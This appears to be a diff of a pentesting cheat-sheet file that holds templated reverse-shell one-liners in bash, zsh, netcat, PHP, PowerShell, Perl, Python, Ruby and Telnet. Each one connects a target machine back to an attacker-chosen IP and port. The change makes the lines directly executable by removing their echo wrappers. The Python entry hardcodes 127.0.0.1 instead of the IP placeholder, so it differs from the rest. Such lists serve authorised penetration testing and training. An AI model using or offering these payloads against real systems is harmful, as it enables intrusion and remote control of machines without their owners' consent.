@@ -4,39 +4,39 @@ $ local_ip: echo $(ip -br a sh dev tun0 2>/dev/null||ip -br a sh dev eth0) | awk
 $ port: echo '443 1234 4444 32000' | tr ' ' '\n'
 $ shell: echo '/bin/bash /bin/zsh /bin/ash /bin/dash /bin/ksh /bin/sh bash zsh ash dash ksh sh' | tr ' ' '\n'
 
-# Bash
+# bash
 
-echo "<shell> -c 'exec <shell> -i &>/dev/tcp/<local_ip>/<port> <&1'"
+bash -c 'exec <shell> -i &>/dev/tcp/<local_ip>/<port> <&1'
 
 # zsh
 
-echo "zsh -c 'zmodload zsh/net/tcp && ztcp <local_ip> <port> && zsh >&\$REPLY 2>&\$REPLY 0>&\$REPLY'"
+zsh -c 'zmodload zsh/net/tcp && ztcp <local_ip> <port> && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'
 
-# Netcat
+# netcat
 
-echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|<shell> -i 2>&1|nc <local_ip> <port> >/tmp/f"
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|<shell> -i 2>&1|nc <local_ip> <port> >/tmp/f
 
-# PHP
+# php
 
-echo php -r "'\$sock=fsockopen(\"<local_ip>\",\"<port>\");exec(\"<shell> -i <&3 >&3 2>&3\");'"
+php -r '$sock=fsockopen("<local_ip>","<port>");exec("<shell> -i <&3 >&3 2>&3");'
 
 
-# PowerShell
+# powershell
 
-echo powershell -nop -c '"'"\$client = New-Object System.Net.Sockets.TCPClient('<local_ip>',<port>);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()"'"'
+powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<local_ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
 
-# Perl
+# perl
 
-echo perl -e "'"'use Socket;$i="<local_ip>";$p=<port>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("<shell> -i");};'"'"
+perl -e 'use Socket;$i="<local_ip>";$p=<port>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("<shell> -i");};'
 
-# Python
+# python
 
-echo python -c "'"'import os,pty,socket,sys;s=socket.socket();s.connect((("127.0.0.1"),int("<port>")));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("<shell>");'"'"
+python -c 'import os,pty,socket,sys;s=socket.socket();s.connect((("127.0.0.1"),int("<port>")));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("<shell>");'
 
-# Ruby
+# ruby
 
-echo ruby -rsocket -e "'"'exit if fork;c=TCPSocket.new("<local_ip>","<port>");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'"'"
+ruby -rsocket -e 'exit if fork;c=TCPSocket.new("<local_ip>","<port>");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
 
-# Telnet
+# telnet
 
-echo "TF=\$(mktemp -u); mkfifo \$TF && telnet <local_ip> <port> 0<\$TF | <shell> 1>\$TF"
+TF=$(mktemp -u); mkfifo $TF && telnet <local_ip> <port> 0<$TF | <shell> 1>$TF
